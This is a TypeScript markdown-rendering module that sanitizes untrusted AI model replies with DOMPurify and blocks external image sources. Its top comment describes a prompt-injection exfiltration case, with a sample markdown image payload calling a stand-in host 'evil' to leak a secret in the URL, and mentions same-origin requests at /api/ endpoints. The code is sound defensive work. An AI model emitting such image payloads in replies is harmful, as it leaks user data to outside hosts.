import DOMPurify from "dompurify";
import { marked } from "marked";
import { t } from "./i18n";

marked.setOptions({ breaks: true, gfm: true });

// A model reply is untrusted: a prompt-injected `![](https://evil/?d=secret)`
// would otherwise load with zero clicks and leak data in the URL. So only
// inline data:image/* and the app's own static image folders may render as
// images (the CSP's img-src enforces same-origin as a second layer). Other
// same-origin paths are refused too: an <img> pointing at /api/... or
// /host/... would fire a cookie-carrying GET at the panel's own endpoints.
const ALLOWED_IMAGE_PREFIXES = ["/icons/", "/assets/"];

function isAllowedImageSrc(src: string): boolean {
  const value = src.trim();
  if (/^data:image\//i.test(value)) return true;
  return ALLOWED_IMAGE_PREFIXES.some((prefix) => value.startsWith(prefix)) && !value.includes("..");
}

// DOMPurify hooks are global, so register them once at module load.
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node instanceof HTMLImageElement) {
    if (isAllowedImageSrc(node.getAttribute("src") ?? "")) return;
    const placeholder = node.ownerDocument.createElement("span");
    placeholder.className = "image-blocked";
    const alt = (node.getAttribute("alt") ?? "").trim();
    placeholder.textContent = `\u{1F5BC} [${t("markdown.image_blocked")}${alt ? `: ${alt}` : ""}]`;
    node.replaceWith(placeholder);
    return;
  }
  if (node instanceof HTMLAnchorElement && node.hasAttribute("href")) {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer nofollow");
  }
});

export function renderMarkdown(source: string): string {
  const html = marked.parse(source, { async: false }) as string;
  return DOMPurify.sanitize(html, {
    FORBID_TAGS: ["form", "input", "button", "iframe", "object", "embed", "style", "source"],
    FORBID_ATTR: ["style", "srcset"],
  });
}
